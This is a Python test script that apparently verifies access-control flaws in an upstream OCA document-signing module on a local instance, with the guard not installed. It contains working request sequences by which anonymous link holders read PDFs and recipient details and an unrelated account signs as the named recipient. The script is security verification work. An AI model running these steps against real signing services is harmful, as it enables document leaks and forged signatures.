#!/usr/bin/env python3
import hashlib, json, requests
from local_client import ROOT, BASE, fixtures, session, rpc
f = fixtures()['upstream']
path = lambda route: f"/sign_oca/{route}/{f['signerId']}/{f['token']}"
outsider = session('mallory')
anonymous = requests.Session()
report = {'scope': 'Pinned upstream OCA engine; guard NOT installed', 'requestId': f['requestId'], 'tests': []}
def record(name, passed, detail):
    assert passed, name
    report['tests'].append({'name': name, 'observed': True, 'detail': detail})
content = anonymous.get(BASE + path('content'), allow_redirects=False)
record('anonymous_bearer_content', content.status_code == 200 and content.content.startswith(b'%PDF'), 'Anonymous possession of link discloses PDF')
report['unsignedSha256'] = hashlib.sha256(content.content).hexdigest()
info = rpc(anonymous, path('info'))
record('anonymous_bearer_info', info.get('result', {}).get('partner', {}).get('email') == 'alice@example.test', 'Anonymous link reveals recipient identity and signable fields')
redirect = outsider.get(BASE + f"/my/sign/{f['requestId']}/download", allow_redirects=False)
record('unrelated_authenticated_download_redirect', redirect.status_code in (302, 303) and '/web/content/' in redirect.headers.get('Location', ''), 'Unrelated portal account receives attachment bearer download redirect')
leaked = redirect.headers['Location']
download = anonymous.get(BASE + leaked)
record('forwarded_attachment_bearer_download', download.status_code == 200 and download.content.startswith(b'%PDF'), 'Issued attachment URL downloads without login')
forwarded = rpc(outsider, path('info'))
items = forwarded['result']['items']
items['1']['value'] = 'FORWARDED LINK: Synthetic Mallory claimed Alice acknowledgement'
signed = rpc(outsider, path('sign'), {'items': items})
record('forwarded_link_signs_as_named_recipient', 'result' in signed and signed['result'].get('type') == 'ir.actions.act_url', 'Unrelated authenticated account can execute actual upstream signing engine using Alice bearer link')
final = anonymous.get(BASE + path('content'))
record('engine_changes_pdf', final.status_code == 200 and final.content != content.content, 'Upstream OCA engine modified PDF bytes')
report['finalSha256'] = hashlib.sha256(final.content).hexdigest()
(ROOT / 'artifacts/upstream-tests.json').write_text(json.dumps(report, indent=2))
(ROOT / 'runtime/upstream-leaked.json').write_text(json.dumps({'attachmentUrl': leaked}))
print(json.dumps(report, indent=2))
